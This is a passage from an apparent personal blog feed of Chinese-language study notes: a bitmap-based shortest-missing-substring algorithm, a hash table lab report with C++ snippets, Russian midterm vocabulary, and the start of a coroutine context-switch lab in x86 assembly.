class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为此, 首先读入 <code>str</code> 末端的 $k$ 长子串 <code>get</code>, 调用 <code>a-&gt;set(get)</code> 将其存储在 <code>Bitmap* a</code> 中, 并使用一个 <code>while</code> 循环遍历接下来所有 $k$ 长子串.</p><h4 id="void-set-end"><a href="#void-set-end" class="headerlink" title="void set_end()"></a>void set_end()</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 68</span><span class="token keyword">void</span> <span class="token function">set_end</span> <span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> str<span class="token punctuation">,</span> Bitmap<span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    a<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>调用 <code>set_end()</code> 将 <code>str</code> 末尾的 $k - 1$ 位 $01$ 子串加入 <code>Bitmap* b</code>.</p><p>考虑到长度为 $k - 1$ 的子串. 对于所有 $k$ 长子串的十进制值 $S_1, S_2, \cdots, S_{\vert A\vert - k + 1}$, 长度为 $k - 1$ 的子串恰为所有 $k$ 长子串删去最后一位, 再补上 <code>str</code> 中末端的 $k - 1$ 长子串, 其十进制值 $R_1 = S_1\gg 1, R_2 = S_2\gg 1, \cdots, R_{\vert A\vert - k + 1} = S_{\vert A\vert - k + 1}\gg 1, R_{\vert A\vert - k + 2}$, 其中 $R_{\vert A\vert - k + 2}$ 调用 <code>set_end(str, b, len - k, k)</code> 来设置.</p><p>接下来调用 <code>check_full(b, k)</code> 检查 <code>Bitmap* b</code> 中是否已经存储了所有 $k - 1$ 长子串.</p><h4 id="void-get-ans"><a href="#void-get-ans" class="headerlink" title="void get_ans()"></a>void get_ans()</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 82</span><span class="token keyword">void</span> <span class="token function">get_ans</span> <span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> output<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> precision<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>a<span class="token operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            output <span class="token operator">=</span> i<span class="token punctuation">;</span>            precision <span class="token operator">=</span> k<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若所有 $k - 1$ 长子串都已经存储在了 <code>Bitmap* b</code> 中, 那么说明 <code>str</code> 中首个未出现的字符串长度为 $k$, 只需调用 <code>get_ans(a, k, output, precision)</code> 在 <code>Bitmap* a</code> 中遍历寻找首个未出现的 $k$ 长子串, 并调用 <code>show_ans(output, precision)</code> 输出在原串中未出现的最短且字典序最小的 $k$ 长子串即可.</p><h4 id="void-trans"><a href="#void-trans" class="headerlink" title="void trans()"></a>void trans()</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 54</span><span class="token keyword">void</span> <span class="token function">trans</span> <span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> a<span class="token punctuation">,</span> Bitmap<span class="token operator">*</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            b<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>否则, 若存在 $k - 1$ 长子串未存储在 <code>Bitmap* b</code> 中, 那么调用 <code>copy(a, b)</code> 将 <code>Bitmap* b</code> 的值赋给 <code>Bitmap* a</code>, <code>k</code> 自减, 并调用 <code>b-&gt;clean()</code> 将 <code>Bitmap* b</code> 置零. 此时 <code>Bitmap* a</code> 存储了所有 $k$ 长子串, 并调用 <code>trans(a, b, k)</code> 利用其中值更新 <code>Bitmap* b</code> 中的 $k - 1$ 长子串, 仍然需要使用 <code>set_end(str, b, len - k, k)</code> 将 <code>str</code> 末端的子串加入 <code>b</code>.</p><p>当遍历到长度为 $k - 1$ 的串全部存在, 而 $k$ 长子串存在缺失时, 将 $k$ 长子串所缺少十进制值对应的首个 $01$ 子串输出.</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>第一次读入串 <code>str</code> 的时间复杂度为 $O(\vert A\vert)$;</p><p>对于子串的处理考虑极端情况, 对 $k$ 长子串存储、遍历枚举、更新所需要时间为 $O(2^k)$, 若从长 $24$ 子串遍历至长 $1$ 子串, 消耗时间为 $O(2^{25})$.</p><p>综上, 算法最坏时间复杂度为 $O(\vert A\vert + 2^{25})$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>空间复杂度主要来自于使用了 <code>Bitmap</code> 存储目的串的过程.</p><p>最坏情况下开辟了两个可存储 $2^{24}$ <code>bit</code>, 一个可存储 $2^{23}$ <code>bit</code> 的 <code>Bitmap</code>, 最坏情况空间复杂度为: $(2\times 2^{24} + 2^{23}) bit = 5\times 2^{20} B = 5MB$, 在题目要求范围内.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashFun</title>
      <link href="/2022/11/13/shu-ju-jie-gou-hashfun/"/>
      <url>/2022/11/13/shu-ju-jie-gou-hashfun/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-LAB2"><a href="#CST-LAB2" class="headerlink" title="CST LAB2"></a>CST LAB2</h1><h2 id="HashFun"><a href="#HashFun" class="headerlink" title="HashFun"></a>HashFun</h2><h3 id="策略实现-396字"><a href="#策略实现-396字" class="headerlink" title="策略实现 (396字)"></a>策略实现 (396字)</h3><h4 id="good-hashing"><a href="#good-hashing" class="headerlink" title="good_hashing"></a><code>good_hashing</code></h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> good_hashing<span class="token double-colon punctuation">::</span><span class="token keyword">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> seed <span class="token operator">=</span> <span class="token number">131</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        hash <span class="token operator">=</span> hash <span class="token operator">*</span> seed <span class="token operator">+</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        hash <span class="token operator">%=</span> N<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> hash<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处参考了 <code>BKDR hash</code> 函数, 使用 <code>seed = 131</code> 作为种子, 可实现较为均匀的 <code>hash</code> 映射.</p><h4 id="poor-hashing"><a href="#poor-hashing" class="headerlink" title="poor_hashing"></a><code>poor_hashing</code></h4><p><code>poor_hashing</code> 函数定义为: <script type="math/tex">poor\_hashing(str)=89\{\sum_{i = 0}^{len(str)-1} str[i]\}\%N.</script></p><p>由于 <code>ascii</code> 的大小为 <code>0~127</code>, 且字符串长度受限制, 生成的 <code>hash</code> 值最多不会超过 <code>200000</code>, 这导致了不均匀的到 <code>TABLE_SIZE</code> 的映射; 同时对字符串直接求和的操作很容易导致 <code>collision</code>.</p><h4 id="quadratic-probe"><a href="#quadratic-probe" class="headerlink" title="quadratic_probe"></a><code>quadratic_probe</code></h4><p>定义 <code>int dist</code> 为当前双向试探的试探长度, <code>bool direction</code> 为当前双向试探的试探方向. 每次执行 <code>init()</code> 时, 初始化 <code>dist = 0; direction = false;</code>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> quadratic_probe<span class="token double-colon punctuation">::</span><span class="token keyword">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>hash_entry<span class="token operator">*</span> Table<span class="token punctuation">,</span> <span class="token keyword">int</span> table_size<span class="token punctuation">,</span> <span class="token keyword">int</span> last_choice<span class="token punctuation">)</span><span class="token punctuation">{</span>    dist<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> offset<span class="token punctuation">,</span> pos<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>direction<span class="token punctuation">)</span> <span class="token punctuation">{</span>        direction <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>dist <span class="token operator">*</span> dist<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> table_size<span class="token punctuation">;</span>        pos <span class="token operator">=</span> last_choice <span class="token operator">-</span> offset<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>pos <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> pos <span class="token operator">+=</span> table_size<span class="token punctuation">;</span>        <span class="token keyword">return</span> pos<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次冲突时, 依据 <code>direction</code> 的值决定偏移方向, 依据 <code>dist</code> 的大小决定偏移量.</p><h4 id="overflow-probe"><a href="#overflow-probe" class="headerlink" title="overflow_probe"></a><code>overflow_probe</code></h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token generic-function"><span class="token function">dynamic_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span>overflow_probe<span class="token operator">*</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>my_collision<span class="token punctuation">)</span><span class="token punctuation">)</span>    table_size <span class="token operator">=</span> <span class="token number">400031</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此处修改了测试框架, 若 <code>my_collision</code> 可成功动态转换为 <code>overflow_probe*</code> 指针, 此时使用公共溢出区策略, 将 <code>table_size</code> 修改为 <code>400031</code>.</p><p>定义 <code>int overflow_head</code> 为当前缓冲区的起始 <code>index</code>. 每次执行 <code>init()</code> 时, 初始化 <code>overflow_head = 400031</code>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> overflow_probe<span class="token double-colon punctuation">::</span><span class="token keyword">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>hash_entry<span class="token operator">*</span> Table<span class="token punctuation">,</span> <span class="token keyword">int</span> table_size<span class="token punctuation">,</span> <span class="token keyword">int</span> last_choice<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> overflow_head<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>每次冲突时, 顺次遍历缓冲区直到返回一个可供插入词条的空位置.</p><h3 id="测试数据-222字"><a href="#测试数据-222字" class="headerlink" title="测试数据 (222字)"></a>测试数据 (222字)</h3><p><code>generator.cpp</code> 作为数据生成器.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* generator.cpp */</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>num <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">500000</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用当前时间作为随机数种子, 产生 <code>1~500000</code> 内的随机数作为行号, 将 <code>poj.txt</code> 的该行信息作为输入数据;</p><p>使用 <code>ReadLine(filename, line)</code> 读入 <code>poj.txt</code> 的指定行信息;</p><p>使用 <code>GenerateInsert(srt)</code> 与 <code>GenerateQuery(srt)</code> , 通过 <code>string</code> 的 <code>substr()</code> 与 <code>find()</code> 方法从该行字符串中构造符合格式的输入数据;</p><p><code>shuffle_pattern</code> 决定是否对插入和删除操作进行打乱 (即随机化).</p><ul><li>数据 <code>01.in</code> 进行了 <code>40000</code> 次插入, <code>40000</code> 次查询,  遵循先插入后查询的次序;</li><li>数据 <code>02.in</code> 进行了 <code>100000</code> 次插入, <code>100000</code> 次查询, 遵循先插入后查询的次序; </li><li>数据 <code>03.in</code> 进行了 <code>100000</code> 次插入, <code>100000</code> 次查询,  遵循边插入边查询的次序.</li></ul><blockquote><p>生成数据的参数附在 <code>parameters.txt</code> 中.</p></blockquote><h3 id="分析结果-276字"><a href="#分析结果-276字" class="headerlink" title="分析结果 (276字)"></a>分析结果 (276字)</h3><ol><li>“好” 哈希函数的性能更佳. 因为 “坏” 哈希函数将字符串不均匀地映射到哈希表中, 容易导致<code>hash</code>聚集, 增大了冲突可能, 在处理冲突时会消耗更多时间.</li><li>双向平方试探性能更佳. 当数据规模较大时, 使用双向平方试探移动出冲突区域的效率较高; 同时, 比起使用 “坏” 哈希函数, 使用 “好” 哈希函数时这种移动的效率会更高.</li><li>使用 “好” 哈希函数时封闭散列性能略占优, 使用 “坏” 哈希函数时开放散列性能明显占优, 总体上开放散列性能占优. 在数据装填因子大、哈希函数均匀的情况下适合使用封闭散列.</li><li>这会导致字符串分布出现一定的规律性, 映射后的 <code>hash</code> 冲突较为严重, 使得性能出现下降.</li><li>模拟 <code>vector</code> 类的扩容, 在装填因子较大或较小时, 重新动态分配 <code>hash_entry* new_table</code>, 迁移原表数据, 并释放原指针即可.</li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure &amp; Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Russian Midterm Revision</title>
      <link href="/2022/11/10/e-yu-qi-zhong-fu-xi/"/>
      <url>/2022/11/10/e-yu-qi-zhong-fu-xi/</url>
      
        <content type="html"><![CDATA[<h3 id="及物动词"><a href="#及物动词" class="headerlink" title="及物动词"></a><strong>及物动词</strong></h3><ul><li>есть; </li><li>делать, читать, считать, искать, знать, слушать; </li><li>смотреть, писать, учить.</li></ul><ol><li><p>делать (做):</p><p>делать урок; делать <strong>упражнение</strong>;</p></li><li><p>читать (读):</p><p>читать <strong>книгу</strong>; читать текст; читать диалог; читать <strong>стихи</strong> (诗歌); </p></li><li><p>считать (数):</p><p>считать бананы; </p></li><li><p>искать (寻找):</p><p>искать часы; искать плащ; искать <strong>счастье</strong>; </p></li><li><p>знать (了解, 认识):</p><p>знать это; знать тебя; знать <strong>русский язык</strong> (俄语); </p></li><li><p>слушать (听):</p><p>слушать <strong>музыку</strong>; слушать текст; слушать <strong>диалог</strong>; слушать <strong>стихи</strong>;</p></li><li><p>смотреть (看):</p><p>смотреть <strong>телевизор</strong> (电视); смотреть <strong>фильм</strong> (电影); </p></li><li><p>писать (写):</p><p>писать <strong>письмо</strong> (信); писать новые слова; писать диалог; писать <strong>стихи</strong>. </p></li></ol><h3 id="非及物动词"><a href="#非及物动词" class="headerlink" title="非及物动词"></a><strong>非及物动词</strong></h3><ul><li>работать, отдыхать, ужинать, играть, жить; </li><li>говорить, хотеть, обедать, учиться.</li></ul><ol><li><p>работать (工作):</p><p>работать на заводе; работать в Пекине; работать в Москве; работать на юге;</p></li><li><p>отдыхать (休息):</p><p>отдыхать дома; отдыхать на юге;</p></li><li><p>завтракать, обедать, ужинать (吃早 / 午 / 晚饭):</p><p>~ дома; ~ в кафе; ~ в институте; ~ в <strong>буфете</strong> (小吃部);</p></li><li><p>жить (居住):</p><p>жить дома; жить в институте; жить в Санкт-Петербурге;</p></li><li><p>играть (玩):</p><p>играть в футбол; играть в шахматы;</p></li><li><p>говорить (说):</p><p>говорить <strong>по-русски</strong>; говорить <strong>по-китайски</strong>;</p></li><li><p>хотеть (想):</p><p>хотеть читать <strong>стихи</strong>; хотеть смотреть <strong>телевизор</strong>; хотеть слушать музыку.</p></li></ol><h3 id="会说十种语言"><a href="#会说十种语言" class="headerlink" title="会说十种语言"></a><strong>会说十种语言</strong></h3><p>говорить по-xxx</p><ul><li><strong>русски</strong> 俄语</li><li><strong>китайски</strong> 汉语</li><li>английски 英语</li><li>немецки 德语</li><li>французски 法语</li><li>японски 日语</li><li>корейски 朝鲜语</li><li>испански 西班牙语</li><li>арабски 阿拉伯语</li><li>итальянски 意大利语</li></ul><h3 id="时间表示法"><a href="#时间表示法" class="headerlink" title="时间表示法"></a><strong>时间表示法</strong></h3><ul><li>один час, час;</li><li>два / три / четыре часа;</li><li>пять / шесть / семь / восемь / девять / десять / одиннадцать / двенадцать часов.</li></ul><h3 id="常用词组"><a href="#常用词组" class="headerlink" title="常用词组"></a><strong>常用词组</strong></h3><ul><li>我 / 你 / 您 / 他 / 她叫… : меня / тебя / вас / его / её зовут…;</li><li>在喷泉旁 : у фонтана;</li><li>您的儿子 : ваш сын;</li><li>我的朋友 : мой друг; <strong>моя подруга</strong>;</li><li>你们的新房子 : ваш новый дом;</li><li>我的旧作业本 : моя старая тетрадь;</li><li>他的新车 : его новая машина;</li><li>我们的旧桌子 : наш старый стол;</li><li>你们的旧花园 : ваш старый сад;</li><li>他们的新护照 : <strong>их новые паспорта</strong>; </li><li>在工厂工作 : работать на заводе; </li><li>在学院里工作 : работать в институте; </li><li>在剧院里工作 : работать в театре; </li><li>读书 : <strong>читать книгу</strong>;</li><li>懂俄语 : <strong>знать русский язык</strong>;</li><li>了解你 : <strong>знать тебя</strong>;</li><li>听音乐 : слушать музыку;?</li><li>在南方休息 :  отдыхать на юге;</li><li>在疗养院休息 : <strong>отдыхать в санатории</strong>;</li><li>在家休息 : отдыхать дома;</li><li>在家吃早餐 : <strong>завтракать дома</strong>;</li><li>在咖啡厅吃午餐 : обедать в кафе;</li><li>在小吃部吃晚餐 : <strong>ужинать в буфете</strong>;</li><li>在教室里做功课 : <strong>делать урок в аудитории</strong>;</li><li>在宿舍里做练习 : <strong>делать упражнение в общежитии</strong>;</li><li>踢足球 : играть в футбол;</li><li>下象棋 : играть в шахматы;</li><li>数香蕉 : считать бананы;</li><li>数菠萝 : считать ананасы;</li><li>写生词 : <strong>писать новые слова</strong>;</li><li>住在莫斯科 : жить в Москве;</li><li>住在上海 : жить в Шанхае;</li><li>说俄语 : <strong>говорить по-русски</strong>; </li><li>说汉语 : <strong>говорить по-китайски</strong>; </li><li>说英语 : <strong>говорить по-английски</strong>; </li><li>背单词 : <strong>учить новые слова</strong>; </li><li>渴望上大学 : <strong>хотеть учиться в университете</strong>; </li><li>渴望在俄罗斯留学 : <strong>хотеть учиться в России</strong>; </li><li>关于我 : <strong>обо мне</strong>; </li><li>3点钟 : три часа; </li><li>5点钟 : пять часов; </li><li>看电视 : <strong>смотреть телевизор</strong>;</li><li>看书 : <strong>читать книгу</strong>; </li><li>寻找教科书 : <strong>искать учебник</strong>; </li><li>今天、昨天、明天 : <strong>сегодня, вчера, завтра</strong>; </li><li>星期二、星期三、星期六 : <strong>вторник, среда, суббота</strong>; </li><li>请问 : <strong>скажите, пожалуйста</strong>;</li><li>几点钟 : <strong>который час</strong>; </li><li>很好 : <strong>очень хорошо</strong>.</li></ul><h3 id="常用问答句型"><a href="#常用问答句型" class="headerlink" title="常用问答句型"></a><strong>常用问答句型</strong></h3><ul><li><p>—Что вы делаете? </p><p>—Я читаю книгу. Я делаю урок.</p></li><li><p><strong>—Что Анна ищет?</strong> </p><p>—Она ищет плащ. </p></li><li><p>—Что ты учишь? </p><p>—Я учу новые слова. </p></li><li><p>—Что ты считаешь? </p><p>—Я считаю ананасы и бананы. </p></li><li><p>—Что они читают? </p><p>—Они читают текст и диалог. </p></li><li><p><strong>—Что ты хочешь делать?</strong> </p><p>—Я хочy учиться в институте. </p></li></ul><ul><li><p><strong>—Что ест твоя сестра (姐妹)?</strong> </p><p>—Она ест суп и салат. </p></li><li><p><strong>—Что учит твой брат?</strong> </p><p>—Он учит новые слова. </p></li><li><p><strong>—Что пишет Инна?</strong> </p><p><strong>—Она пишет письмо. (信)</strong></p></li><li><p><strong>—Что слушают дети?</strong> </p><p>—Они слушают музыку. </p></li></ul><ul><li><p><strong>—Где ты завтракаешь обычно?</strong> </p><p>—Я обычно завтракаю дома. </p></li><li><p><strong>—Где работает твой отец?</strong> </p><p>—Он работает в институте. </p></li><li><p><strong>—Где учится Витя?</strong></p><p>—Он учится в школе. </p></li><li><p>—Где живёт Антон? </p><p>—Он живёт в Санкт-Петербурге. </p></li></ul><ul><li><p><strong>—Который час сейчас?</strong> </p><p><strong>—Сейчас восемь часов.</strong> </p></li><li><p><strong>—Почему Антон много работает?</strong> </p><p>—Он хочет учиться в институте. </p></li><li><p>—Миша живёт в Москве или в Баку?</p><p>—Он живёт в Москве. </p></li><li><p><strong>—Они часто говорят о тебе?</strong> </p><p>—Да, они часто говорят обо мне. </p></li></ul><ul><li><p>—Это стакан? </p><p>—Нет, это ваза. </p></li><li><p><strong>—Чей это шкаф?</strong> </p><p>—Это мой шкаф. </p></li><li><p><strong>—Какая это комната?</strong> </p><p>—Это новая комната. </p></li></ul><ul><li><p><strong>—Как ты говоришь по-русски?</strong> </p><p>—Я говорю по-русски очень хорошо. </p></li><li><p>—Как его зовут?</p><p>—Его зовут Пётр. </p></li><li><p><strong>—Как работает твой брат?</strong> </p><p>—Он работает очень хорошо.</p></li></ul><h3 id="以-b-结尾阳性名词"><a href="#以-b-结尾阳性名词" class="headerlink" title="以 b 结尾阳性名词"></a><strong>以 b 结尾阳性名词</strong></h3><ul><li>словарь (字典), гость (客人), конь (公马); </li></ul><h3 id="以-b-结尾阴性名词"><a href="#以-b-结尾阴性名词" class="headerlink" title="以 b 结尾阴性名词"></a><strong>以 b 结尾阴性名词</strong></h3><ul><li>мать (妈妈), ночь (夜晚), тетрадь (练习本), обувь (鞋子总称), осень (秋天);</li><li>пять, шесть, семь, восемь, девять, десять, одиннадцать, двенадцать (数词).</li></ul><h3 id="六格"><a href="#六格" class="headerlink" title="六格"></a><strong>六格</strong></h3><ul><li><strong>第一格: 主格</strong>, 通常作为主语或谓语.</li><li><strong>第二格: 所属格</strong>, 通常置于它所说明的名词之后, 如 остановка автобуса (公共汽车停车站), сады России (俄罗斯的花园).</li><li><strong>第三格: 给格</strong>, 如 “妈妈给儿子买了新书包” 中 “儿子” 要变第三格.</li><li><strong>第四格:</strong> <ul><li>第一个意义: <strong>客体格</strong>, 表示行为的客体, 如 Он ест суп (他在吃汤), Как тебя зовут (你叫什么名字). </li><li>第二个意义: <strong>方向格</strong>, 如 Я иду на урок. (我去上课), 公式为 运动动词 + на(去…上) 或в(去…里) + 第四格 = 方向. </li><li>第三个意义: <strong>在时间内</strong>, 如 в субботу (在星期六), 公式为 в + 表示时间的名词第四格.</li></ul></li><li><strong>第五格: 工具格</strong>, 如 Антон пишет упражнение ручкой (安东用签字笔写练习).</li><li><strong>第六格: 处所格, 也称前置格</strong>, 必须永远跟着前置词, 表示 “在…地方”, “关于…人、…事儿”, 如 на столе (在桌子上), в столе (在桌子里), о Пушкине (关于普希金), о саде (关于花园). </li></ul>]]></content>
      
      
      <categories>
          
          <category> Russian </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Russian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 Lab 1</title>
      <link href="/2022/11/04/ji-suan-ji-xi-tong-gai-lun-lab-1/"/>
      <url>/2022/11/04/ji-suan-ji-xi-tong-gai-lun-lab-1/</url>
      
        <content type="html"><![CDATA[<h2 id="Task-1-协程库的编写"><a href="#Task-1-协程库的编写" class="headerlink" title="Task 1: 协程库的编写"></a>Task 1: 协程库的编写</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly"># lib/context.S.global coroutine_switchcoroutine_switch:    # 保存栈顶地址到 %rdi 指向的上下文    movq %rsp, 64(%rdi)    # 保存 callee-saved 寄存器到 %rdi 指向的上下文    movq %rbx, 72(%rdi)    movq %rbp, 80(%rdi)    movq %r12, 88(%rdi)    movq %r13, 96(%rdi)    movq %r14, 104(%rdi)    movq %r15, 112(%rdi)    # 利用 rip 相对寻址使 rip 指向 ret 指令的地址 (.coroutine_ret)    leaq .coroutine_ret(%rip), %rax    movq %rax, 120(%rdi)    # 从 %rsi 指向的上下文恢复栈顶地址    movq 64(%rsi), %rsp    # 从 %rsi 指向的上下文恢复 callee-saved 寄存器    movq 72(%rsi), %rbx    movq 80(%rsi), %rbp    movq 88(%rsi), %r12    movq 96(%rsi), %r13    movq 104(%rsi), %r14    movq 112(%rsi), %r15    # jmpq 到上下文保存的 rip    jmpq *120(%rsi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* inc/context.h */</span><span class="token keyword">void</span> <span class="token function">serial_execute_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">bool</span> all_finished <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token comment">// 记录所有协程函数是否执行完成</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>all_finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>        all_finished <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token comment">// 采用轮询的方式挑选一个未完成执行的协程函数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> coroutines<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token 